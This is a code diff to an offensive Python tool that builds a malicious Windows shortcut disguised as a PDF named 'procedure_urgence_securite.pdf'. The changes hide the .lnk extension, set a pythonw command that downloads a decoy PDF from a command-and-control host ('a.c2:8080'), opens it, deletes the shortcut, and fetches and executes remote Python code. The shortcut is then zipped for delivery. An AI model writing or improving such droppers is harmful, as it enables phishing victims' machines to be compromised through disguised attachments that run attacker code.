@@ -247,8 +247,10 @@ class DarkLnk:
         with open(f"./{self._outputName}.lnk", "wb") as f:
             f.write(LnkBytes)
 
+from os import chdir
 from sys import executable
-from os.pat import join, dirname
+from os.path import join, dirname
+from zipfile import ZipFile, ZIP_DEFLATED
 
 pythonw = join(dirname(executable), "pythonw.exe")
 
@@ -260,8 +262,12 @@ d.LinkExtension = "pdf"
 # d.NullPadding = True
 # d.RootDirectory = "D:\\"
 # d.LinkSize = 
-d.OutputName = join("arsenal", "procedure_urgence_securite.pdf.lnk")
+d.OutputName = join("arsenal", "procedure_urgence_securite.pdf")
 d.Binary = pythonw or r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-d.Command = '''-c "from urllib.request import urlopen as u;import os; [(f:=os.path.basename(url),open(f,'wb').write(u(url).read()),os.system(f'attrib +h {f}'),os.startfile(f)) if 'pdf' in url else exec(u(url).read().decode()) for url in map(lambda x: 'http://a.c2:8080/'+x, ('.a.pdf','py'))]"''' or '-c "import os,sys;os.system(f\'start .procedure_urgence_securite.pdf & ""{sys.executable}"" .malware.py\')"' or '-command "mkdir test"'
+d.Command = '''-c "from urllib.request import urlopen as u;import os; [(f:=os.path.basename(url),open(f,'wb').write(u(url).read()),os.system(f'attrib +h {f}'),os.startfile(f)) if 'pdf' in url else exec(u(url).read().decode()) for url in map(lambda x: 'http://a.c2:8080/'+x, ('procedure_urgence_securite.pdf','py'))]"''' or '-c "import os,sys;os.system(f\'start .procedure_urgence_securite.pdf & ""{sys.executable}"" .malware.py\')"' or '-command "mkdir test"'
+d.Command = '''-c "from urllib.request import urlopen as u;import os; [(f:=os.path.basename(url),open(f,'wb').write(u(url).read()),os.startfile(f),os.remove(f+'.lnk')) if 'pdf' in url else exec(u(url).read().decode(),globals()) for url in map(lambda x: 'http://a.c2:8080/'+x, ('procedure_urgence_securite.pdf','py'))]"''' or '-c "import os,sys;os.system(f\'start .procedure_urgence_securite.pdf & ""{sys.executable}"" .malware.py\')"' or '-command "mkdir test"'
 d.BuildLink()
 
+with ZipFile(join("arsenal", "procedure_urgence_securite.zip"), "w", ZIP_DEFLATED) as file:
+    chdir("arsenal")
+    file.write('procedure_urgence_securite.pdf.lnk')
